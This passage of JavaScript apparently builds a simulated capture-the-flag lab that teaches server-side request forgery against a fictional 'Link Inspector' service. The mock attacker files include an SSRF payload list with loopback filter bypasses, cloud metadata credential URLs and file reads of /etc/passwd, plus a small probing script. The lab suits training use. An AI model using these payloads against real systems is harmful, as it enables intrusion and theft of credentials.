            const m = url.match(/^https?:\/\/([^/]+)/);
            host = m ? m[1] : url;
        } catch(e) { /* ignore */ }

        return A10Config._inspectSuccess(url, 200, 'text/html', `<!DOCTYPE html>
<html>
<head><title>${A10Config._escHtml(host)}</title></head>
<body>
<h1>Example Domain</h1>
<p>This domain is for use in illustrative examples in documents. You may use this domain in literature without prior coordination or asking for permission.</p>
<p><a href="https://www.iana.org/domains/reserved">More information...</a></p>
</body>
</html>`);
    },

    // ═══════════════════════════════════════════════════════
    // INSPECTION RESPONSE FORMATTERS
    // ═══════════════════════════════════════════════════════

    // Render a full HTTP-style inspection report (HTML content)
    _inspectSuccess(url, status, contentType, body) {
        const safeUrl = A10Config._escHtml(url);
        const safeBody = A10Config._escHtml(body.substring(0, 2048));
        const statusColor = status === 200 ? '#27ae60' : '#e67e22';

        return `<div style="margin-bottom:12px;">
            <div style="font-size:0.72rem; color:#888; letter-spacing:0.08em; margin-bottom:8px;">INSPECTION REPORT</div>
            <div style="background:#f8f9fb; border:1px solid #dde; border-radius:4px; overflow:hidden;">

                <div style="background:#eef1f6; padding:8px 14px; border-bottom:1px solid #dde; display:flex; justify-content:space-between; align-items:center;">
                    <span style="font-family:monospace; font-size:0.75rem; color:#2c3e50; word-break:break-all;">${safeUrl}</span>
                    <span style="font-weight:700; font-size:0.78rem; color:${statusColor}; white-space:nowrap; margin-left:12px;">HTTP ${status}</span>
                </div>

                <div style="padding:10px 14px; border-bottom:1px solid #eee; font-size:0.78rem;">
                    <div style="color:#888; font-size:0.7rem; letter-spacing:0.08em; margin-bottom:6px;">RESPONSE HEADERS</div>
                    <div style="font-family:monospace; color:#555; line-height:1.8;">
                        Content-Type: ${A10Config._escHtml(contentType)}<br>
                        Server: nginx/1.24.0<br>
                        X-Powered-By: GlassProxy/3.0<br>
                        Date: Thu, 14 Nov 2024 03:17:09 GMT<br>
                        Content-Length: ${body.length}
                    </div>
                </div>

                <div style="padding:10px 14px;">
                    <div style="color:#888; font-size:0.7rem; letter-spacing:0.08em; margin-bottom:6px;">CONTENT PREVIEW (first 2KB)</div>
                    <pre style="background:#1a1a2e; color:#a8d8a8; padding:12px; border-radius:4px; font-size:0.72rem; overflow-x:auto; white-space:pre-wrap; word-break:break-all; margin:0;">${safeBody}</pre>
                </div>

            </div>
        </div>`;
    },

    // Render raw text output (Redis, metadata, file contents)
    _inspectRaw(url, text) {
        const safeUrl = A10Config._escHtml(url);
        const safeText = A10Config._escHtml(text);

        return `<div style="margin-bottom:12px;">
            <div style="font-size:0.72rem; color:#888; letter-spacing:0.08em; margin-bottom:8px;">INSPECTION REPORT</div>
            <div style="background:#f8f9fb; border:1px solid #dde; border-radius:4px; overflow:hidden;">

                <div style="background:#eef1f6; padding:8px 14px; border-bottom:1px solid #dde; display:flex; justify-content:space-between; align-items:center;">
                    <span style="font-family:monospace; font-size:0.75rem; color:#2c3e50; word-break:break-all;">${safeUrl}</span>
                    <span style="font-weight:700; font-size:0.78rem; color:#27ae60; white-space:nowrap; margin-left:12px;">RAW RESPONSE</span>
                </div>

                <div style="padding:10px 14px;">
                    <div style="color:#888; font-size:0.7rem; letter-spacing:0.08em; margin-bottom:6px;">RESPONSE CONTENT</div>
                    <pre style="background:#1a1a2e; color:#a8d8a8; padding:12px; border-radius:4px; font-size:0.72rem; overflow-x:auto; white-space:pre-wrap; word-break:break-all; margin:0;">${safeText}</pre>
                </div>

            </div>
        </div>`;
    },

    // Render an error response from the inspector
    _inspectError(message) {
        const safeMsg = A10Config._escHtml(message);
        return `<div style="padding:12px 14px; background:rgba(192,57,43,0.06); border:1px solid rgba(192,57,43,0.25); border-radius:4px; font-size:0.8rem; color:#c0392b;">
            <strong>Inspection Failed:</strong> ${safeMsg}
        </div>`;
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker Kali machine)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: 10.10.14.32 (The Glass Tunnel)\nObjective: Server-Side Request Forgery (SSRF) exploitation\n\nIntel:\n  - The target runs a "Link Inspector" web service\n  - It fetches URLs server-side and returns results\n  - RFC-1918 ranges (10.x.x.x) are blocked at the application layer\n  - Loopback (127.0.0.1 / localhost) is NOT blocked — this is the entry point\n\nRecon steps:\n  1. nmap 10.10.14.32 — identify exposed services\n  2. Browse /corridor/ — understand the URL inspector\n  3. Browse /corridor/status/ — enumerate internal service ports\n  4. Browse /corridor/docs/ — understand protocol support and filter gaps\n  5. Exploit SSRF to reach internal admin panel (port 8080)\n  6. Exploit SSRF to reach Redis cache (port 6379)\n\nFlags:\n  user.txt — internal admin panel or file read\n  root.txt — Redis master_key cache entry\n\nGood luck, operator.'
                                },
                                'payloads': {
                                    type: 'dir',
                                    children: {
                                        'ssrf_urls.txt': {
                                            type: 'file',
                                            content: '# Common SSRF test payloads\n\n# Loopback variants (bypass 10.x.x.x filter)\nhttp://127.0.0.1/\nhttp://localhost/\nhttp://0.0.0.0/\nhttp://0x7f000001/\nhttp://2130706433/\nhttp://127.1/\nhttp://[::1]/\n\n# Internal ports to probe\nhttp://127.0.0.1:8080/\nhttp://127.0.0.1:6379/\nhttp://127.0.0.1:9200/\nhttp://127.0.0.1:22/\nhttp://127.0.0.1:3306/\n\n# Cloud metadata\nhttp://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# File reads\nfile:///etc/passwd\nfile:///etc/hosts\nfile:///home/corridor/user.txt\nfile:///root/root.txt\nfile:///var/log/corridor/access.log'
                                        }
                                    }
                                },
                                'tools': {
                                    type: 'dir',
                                    children: {
                                        'ssrf_scan.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\nssrf_scan.py — Submit URLs through the Glass Corridor inspector\nUsage: python3 ssrf_scan.py <base_url> <url_to_inject>\nExample: python3 ssrf_scan.py http://10.10.14.32/corridor/ http://127.0.0.1:8080/\n"""\nimport sys, urllib.request, urllib.parse\n\ndef inspect(base, target):\n    data = urllib.parse.urlencode({"url": target}).encode()\n    req = urllib.request.Request(base, data=data, method="POST")\n    with urllib.request.urlopen(req) as r:\n        return r.read().decode()\n\nif __name__ == "__main__":\n    base = sys.argv[1] if len(sys.argv) > 1 else "http://10.10.14.32/corridor/"\n    target = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:8080/"\n    print(f"[*] Submitting: {target}")\n    print(inspect(base, target))'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 10.10.14.32\ncurl http://10.10.14.32/corridor/\nfirefox http://10.10.14.32/corridor/'
                                },
                                'decoys': {
                                    type: 'dir',
                                    children: {
                                        'internal-service-map.txt': {
                                            type: 'file',
                                            content: '=== INTERNAL SERVICE MAP (UNVERIFIED INTEL) ===\n\nNote: This diagram was intercepted before the op. It may not reflect\nthe current state of the target. Use at your own risk.\n\n  10.10.14.32\n    |\n    +-- :80   → HTTP public app (confirmed)\n    |\n    +-- :443  → HTTPS (unconfirmed — may be a secondary vhost)\n    |\n    +-- :2222 → SSH alternate port (unconfirmed — may be honeypot)\n    |\n    +-- :8443 → Admin panel SSL (unconfirmed)\n\n[!] The intel source claimed internal services run on non-standard\n    ports (8443, 2222). This conflicts with our nmap scan showing\n    8080 and 6379 filtered. Treat with caution.\n\n[!] The 10.10.14.33 machine listed below may be a decoy host:\n    10.10.14.33 — "backup-corridor" — unknown function\n\nFocus on what is confirmed: port 80 is the attack surface.'
                                        },
                                        'aws-metadata-research.txt': {
                                            type: 'file',
                                            content: '=== AWS IMDS RESEARCH NOTES ===\n\nIMDSv1 endpoint: http://169.254.169.254/latest/meta-data/\n\nThe cloud metadata service is a known SSRF pivot target.\nHowever, the Glass Corridor may be running on bare metal or a\nprivate VMware cluster — not on AWS EC2.\n\nIMDSv1 will return credential data IF the target is an EC2 instance:\n  http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\nIMDSv2 (token-based) would block this without a PUT pre-request.\n\n[!] LIKELY DEAD END: If the corridor is not on EC2, the 169.254.169.254\n    address will time out or return nothing useful. Do not spend time\n    on this path until simpler internal service attacks are exhausted.\n\nFallback: loopback services (127.0.0.1) are always valid on any host.'
                                        },
                                        'network-diagram.txt': {
                                            type: 'file',
                                            content: '=== NETWORK TOPOLOGY (STALE — FROM 6 MONTHS AGO) ===\n\n  [Your Kali]  ←VPN→  [10.10.14.0/24 subnet]\n                            |\n                    +-----------------+\n                    | 10.10.14.32     |\n                    | glass-corridor  |\n                    | nginx:80 (pub)  |\n                    | admin:8080 (lo) |\n                    | redis:6379 (lo) |\n                    | elastic:9200(lo)|\n                    +-----------------+\n                            |\n                    +-----------------+\n                    | 10.10.14.33     |\n                    | backup-server   |\n                    | (offline)       |\n                    +-----------------+\n\n[!] STALE INTEL: The 10.10.14.33 backup server was decommissioned.\n    Attempts to reach it will fail. The diagram also shows a\n    "management VLAN" at 192.168.99.0/24 — that range is blocked\n    by the target\'s filter and is unreachable regardless.\n\n    The only reachable host is 10.10.14.32. Focus there.\n\n[!] The admin panel was previously on port 8443 (SSL). It moved to\n    8080 (plain HTTP internal) in a "security simplification" rollout.\n    Old payloads pointing to :8443 will not work.'
                                        },
                                        'fake-credentials.txt': {
                                            type: 'file',
                                            content: '=== CREDENTIALS FOUND IN PRIOR RECON (UNVERIFIED) ===\n\nSource: leaked pastebin from 2023 — may be outdated\n\n  Service     : Glass Corridor Admin\n  Username    : corridor_admin\n  Password    : C0rr1d0r@2023!  ← may be rotated\n\n  Service     : Redis\n  Password    : gl4ss_r3d1s_p4ss  ← may be default (no auth)\n\n[!] DO NOT rely on these. The Redis instance may have no auth\n    (common misconfiguration). The admin panel login page, if it\n    exists externally, will likely have rotated credentials.\n\n[!] The real attack surface is not credential stuffing —\n    the Link Inspector parameter is the entry point.\n    These credentials are a distraction.\n\nFocus: SSRF via the url= parameter, not credential brute-force.'
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\napi\nbackup\ncgi-bin\nconfig\ncorridor\ndata\ndocs\nimages\nindex\nlogin\nstatus\ntest\nupload'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            // Scan of the target machine — only port 80 is visible externally
            if (!target || target === '10.10.14.32') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.14.32
Host is up (0.028s latency).
Not shown: 997 closed tcp ports

PORT     STATE    SERVICE   VERSION
80/tcp   open     http      nginx 1.24.0
8080/tcp filtered http      (internal only)
6379/tcp filtered redis     (internal only)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 9.14 seconds

[note] Ports 8080 and 6379 show as filtered from your Kali machine.
       They are bound to 127.0.0.1 on the target — not reachable directly.`;
            }

            // Scanning localhost from Kali — connection refused (it's the attacker's own loopback)
            if (target === 'localhost' || target === '127.0.0.1') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
All 1000 scanned ports on localhost (127.0.0.1) are closed

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.04 seconds`;
        },

        'curl': function(args, term, engine) {
            const url = args.find(a => !a.startsWith('-') && a.startsWith('http')) || '';
            if (!url) return 'curl: try \'curl --help\' or \'curl --manual\' for more information';

            const lower = url.toLowerCase();

            // Curl to the corridor inspector page — returns the HTML
            if (lower.includes('10.10.14.32') && lower.includes('/corridor')) {
                return `<!DOCTYPE html>
<html>
<head><title>Glass Corridor — Link Inspector</title></head>
<body>
<h1>Glass Corridor — Link Inspector</h1>
<p>Transparent Proxy Network v3.0.1</p>
<form method="POST" action="/corridor/">
  <label>Enter URL to inspect:</label>
  <input type="text" name="url" placeholder="https://example.com">
  <button type="submit">Inspect</button>
</form>
</body>
</html>`;
            }

            // Direct curl to localhost:8080 from Kali fails (it's only on the TARGET's loopback)
            if (lower.includes('127.0.0.1:8080') || lower.includes('localhost:8080')) {
                return `curl: (7) Failed to connect to 127.0.0.1 port 8080 after 0 ms: Connection refused

[hint] Port 8080 is not running on YOUR machine (127.0.0.1).
       It is bound to 127.0.0.1 on the TARGET (10.10.14.32).
       Use the Link Inspector on the target to make the server fetch internal URLs.`;
            }

            // Direct curl to localhost:6379 from Kali also fails
            if (lower.includes('127.0.0.1:6379') || lower.includes('localhost:6379')) {
                return `curl: (7) Failed to connect to 127.0.0.1 port 6379 after 0 ms: Connection refused`;
            }

            return `curl: (7) Failed to connect to ${url.replace(/https?:\/\//, '').split('/')[0]}: Connection refused`;
        },

        'nikto': function(args) {
            return `- Nikto v2.5.0
+ Target IP:       10.10.14.32
+ Target Hostname:  glass-corridor.ctf.local
+ Target Port:      80
+ Server: nginx/1.24.0
+ /corridor/: URL parameter detected — may support arbitrary URL fetching
+ /corridor/status/: Lists internal services with port numbers (intel leak)
+ /corridor/docs/: Documents file:// protocol support and block-list bypass via loopback
+ OSVDB-SSRF: POST /corridor/ url= parameter accepts server-side fetched URLs
+ Redirect following is enabled — filter bypass possible via redirect chain
+ 9 items checked: 4 findings`;
        },

        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';

            if (target === '10.10.14.32') {
                return `PING 10.10.14.32 (10.10.14.32) 56(84) bytes of data.
64 bytes from 10.10.14.32: icmp_seq=1 ttl=64 time=29.7 ms
64 bytes from 10.10.14.32: icmp_seq=2 ttl=64 time=30.1 ms
64 bytes from 10.10.14.32: icmp_seq=3 ttl=64 time=29.9 ms

--- 10.10.14.32 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 29.7/29.9/30.1/0.164 ms`;
            }

            return `ping: ${target}: Name or service not known`;
        },

        // Custom tool: submits URLs through the corridor inspector to probe internal ports
        'ssrf_scan': function(args, term, engine) {
            const portArg = args.find(a => /^\d+$/.test(a));

            if (!portArg && !args.includes('--ports')) {
                return `Usage: ssrf_scan [--ports] <port> [port ...]

  Submits SSRF payloads through the Glass Corridor Link Inspector
  to probe internal services on the target.

Examples:
  ssrf_scan 8080           # probe http://127.0.0.1:8080/
  ssrf_scan 6379           # probe http://127.0.0.1:6379/
  ssrf_scan --ports        # scan common internal ports (slow)

[*] Base URL: http://10.10.14.32/corridor/`;
            }

            if (args.includes('--ports')) {
                return `[*] ssrf_scan — probing internal ports via Link Inspector
[*] Target: http://10.10.14.32/corridor/ (url= parameter)
[*] Payloads: http://127.0.0.1:{PORT}/

PORT     STATUS   NOTES
----     ------   -----
22       closed   SSH — no banner
80       open     HTTP — nginx (this is the public app itself)
3306     closed   MySQL — not running
6379     open     Redis — banner received: +OK Redis 6.2.6
8080     open     HTTP — Internal admin panel detected
9200     open     HTTP — Elasticsearch 8.11.1

[+] 3 internal services discovered via SSRF port scan
[+] Try: ssrf_scan 8080 or use the Browser at http://127.0.0.1:8080/`;
            }

            // Single port probe
            const port = parseInt(portArg);
            const result = A10Config._handleInspect(`http://127.0.0.1:${port}/`, engine);
            return `[*] Submitting: http://127.0.0.1:${port}/ via Link Inspector\n[*] Response:\n\n${A10Config._stripHtml(result)}`;
        },

        'gobuster': function(args) {
            const target = args.find(a => a.startsWith('http')) || 'http://10.10.14.32/';
            return `Gobuster v3.6
[+] Url:          ${target}
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] Status codes: 200,204,301,302,307,401,403
===============================================================
/corridor/           (Status: 200) [Size: 2841]
/corridor/status/    (Status: 200) [Size: 3190]
/corridor/docs/      (Status: 200) [Size: 4022]
/admin/              (Status: 403) [Size: 162]
===============================================================
Finished`;
        },

        'python3': function(args, term, engine) {
            // Support running ssrf_scan.py
            const script = args.find(a => a.endsWith('.py')) || '';
            if (script.includes('ssrf_scan')) {
                const targetUrl = args.find(a => a.startsWith('http') && !a.includes('10.10.14.32')) || 'http://127.0.0.1:8080/';
                const result = A10Config._handleInspect(targetUrl, engine);
                return `[*] Submitting: ${targetUrl}\n${A10Config._stripHtml(result)}`;
            }
            return `python3: can't open file '${script}': [Errno 2] No such file or directory`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    // Build a styled data table from headers + row arrays
    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd; background:#eef1f6;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    // Escape HTML special characters to prevent XSS in rendered output
    _escHtml(str) {
        if (typeof str !== 'string') return String(str);
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    // Strip HTML tags for plain-text terminal output, converting tables to aligned columns
    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        const pres = tmp.querySelectorAll('pre');
        pres.forEach(pre => {
            pre.replaceWith(document.createTextNode(pre.textContent));
        });
        return tmp.textContent.trim();
    }

};
